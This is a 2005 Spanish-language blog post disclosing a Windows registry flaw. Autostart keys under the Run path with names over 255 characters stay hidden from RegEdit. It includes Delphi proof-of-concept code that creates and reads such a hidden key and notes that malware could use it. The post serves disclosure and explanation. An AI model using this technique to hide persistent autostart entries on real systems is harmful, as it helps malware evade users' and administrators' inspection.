---
comments: true
date: 2005-10-12 01:41:54
layout: post
slug: una-seria-falla-en-el-registro-de-windows
title: Una seria falla en el registro de Windows
wordpress_id: 154
categories:
- Sin categoría
---

Sucede que a veces uno se topa con problemas mas grandes de lo que se imagina.

Investigando sobre un fallo reportado en [Secunia en Agosto](http://secunia.com/advisories/16560/), nunca sospeche que el problema era más serio de lo que pensaba.

Esencialmente, la falla permite excribir una entrada (key) en el registry que no es visible para las herramientas como Microsoft RegEdit.

Como se muestra en la imagen, pude crear una entrada oculta en el registry:

![regflaw.JPG](http://www.lnds.net/archives/regflaw.JPG)

Resulta que debajo de Optional hay una llave cuyo nombre consiste de 256 X seguidas.

El siguiente código en Delphi, permite explicar el fallo:
    
    <code style="margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; " language="pascal">procedure TestRegistryFlaw;
    var
    I: Integer;
    reg : TRegistry;
    key : string;
    begin
    reg := TRegistry.Create;
    key := 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Optional\';
    try
    for I := 0 to 255 do    // Iterate
    key := key + 'X';
    reg.RootKey := HKEY_LOCAL_MACHINE;
    if reg.OpenKey(key, true) then
    begin
    ShowMessage('trying to hack');
    reg.WriteString('TestFlaw', 'This is hacked registry key');
    ShowMessage('hacked!!!');
    end;
    finally
    reg.Free;
    end;
    end;
    procedure CheckRegistryFlaw;
    var
    I: Integer;
    reg : TRegistry;
    key : string;
    begin
    reg := TRegistry.Create;
    key := 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Optional\';
    try
    reg.RootKey := HKEY_LOCAL_MACHINE;
    for I := 0 to 255 do    // Iterate
    key := key + 'X';
    if reg.OpenKey(key, false) then
    ShowMessage(reg.ReadString('TestFlaw'));
    finally
    reg.Free;
    end;
    end;</code>

Lo que tenemos aquí es que hemos creado una entrada que no es visible por regedit y otros utilitarios de Windows.

Pero lo peor, es que en Microsoft.Net este código no puede ser creado, porque la Clase RegistryKey hace un chequeo, levantando una excepción si uno trata de escribir una llave de largo mayor que 255.

En suma, lo que hacen en Microsoft.Net es ocultar el bug debajo de la alfombra.

Pero, ¿cual es el problema con esto? es que uno puede escribir código en la llave Run de Windows, con lo que se hace[posible ocultar virus o malware de cualquier tipo](http://techrepublic.com.com/2100-1009_11-5843863.html), para ser ejecutado en cuanto se inicia Windows, y usted no podrá verlo, porque las herramientas de Windows no le dan la posibilidad de revisar este código malicioso.

Es posible escribir código en C# o C++ que hace lo mismo que el código Delphi que escribí más arriba. Sugiero ver mi post en DarkSideProgramming: [Hidding a Flaw](http://www.darksideprogramming.org/archives/2005/10/hidding_a_flaw.html).

Pero lo interesante, es que algunos programadores en CodeProject han descubierto que, al menos en Windows XP conSP2 la falla es más seria !



